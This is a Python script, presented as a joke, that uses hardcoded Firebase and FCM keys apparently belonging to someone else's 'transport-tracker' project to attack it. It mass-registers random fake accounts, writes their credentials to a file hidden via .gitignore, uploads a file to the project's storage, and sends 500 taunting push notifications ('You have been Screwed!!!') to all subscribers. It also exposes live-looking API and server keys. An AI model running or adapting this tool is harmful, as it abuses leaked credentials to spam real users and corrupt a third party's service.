#!usr/bin/env python3

"""
Copyleft
Author: Rakibul Yeasin Totul (fb.com/rytotul)
For Fun Purpose don't take seriously...
"""

# Preventing from writing Bytecodes
import sys
sys.dont_write_bytecode = True

# Importing The Modules
import pyrebase
import random
import string

# Import Firebase messaging service
from pyfcm import FCMNotification

# Firebase Configurations
apiKey      = "AIzaSyCRJyJU8cXuApBmX9kFmrLCYnzJF3ztK64" # Your API key
projectID   = "transport-tracker-56d6b"                 # Your Project ID

# Don't Edit Here...
authDomain      = "{0}.firebaseapp.com".format(projectID)
databaseURL     = "https://{0}.firebaseio.com".format(projectID)
storageBucket   = "{0}.appspot.com".format(projectID)

config = {
    "apiKey"        :   apiKey,
    "authDomain"    :   authDomain,
    "databaseURL"   :   databaseURL,
    "storageBucket" :   storageBucket
}

# You know what it does :D
firebase = pyrebase.initialize_app(config)
auth = firebase.auth()

# PYFCM
fcm_key = "AAAAzSZNbUY:APA91bE-g_vgALMF4u9mqC2rVbPVi_FkiVtXFi3SiK7ya802mWMLUkIxeatHaxTcZfBnQPacCwJUYQoRXSqA6fBF2vJ_zEsfKruxXdxnTYyuKDgB6uVteHJOumJm5-NLYUqRuyZXq4R7"
push_service = FCMNotification(api_key=fcm_key)

def rnd_gen(i):
    """ Fills up a text control with a random string of length "length" """
    s = "abcdefghijklmnopqrstuvwxyz01234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ?" # My Text :P
    text = "".join(random.sample(s, i))
    return text

def sign_up(n):
    """ Generating Random Users """
    email = rnd_gen(6)  + "@playlagom.com"
    password = rnd_gen(8)
    auth.create_user_with_email_and_password(email, password)
    user = "[{0}]\tUsername: {1}\n\tPassword: {2}\n"
    print(user.format(n, email, password))
    return user.format(n, email, password)

def test():
    storage = firebase.storage()
    storage.child("photos/Manali Taracemp4").put("/mnt/Extra/.mp4")

def push_notify():
    result = push_service.notify_topic_subscribers(topic_name="all", message_body="You have been Screwed!!! :D Catch Me if you can....")
    print(result)


def main(option):
    """ The main Function """
    if option == 'b':
        count = int(input("Enter Targeted Number: "))
        n = 1
        file = "credentials_" + rnd_gen(6) + ".txt"
        with open(file, "w") as f:
            while count > 0:
                try:
                    f.write(sign_up(n))
                    count -= 1
                    n += 1
                except:
                    break
        
        gitignore = open(".gitignore", "a")
        gitignore.write(file + "\n")
        gitignore.close()

    elif option == "c":
        test()
    elif option == "p":
        for i in range (500):
            push_notify()

if __name__ == "__main__":
    option = str(input("Enter Option: "))
    main(option)